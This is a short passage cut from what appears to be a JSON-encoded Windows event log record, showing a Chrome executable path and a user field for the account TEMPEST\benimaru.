Files\\Google\\Chrome\\Application\\chrome.exe""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
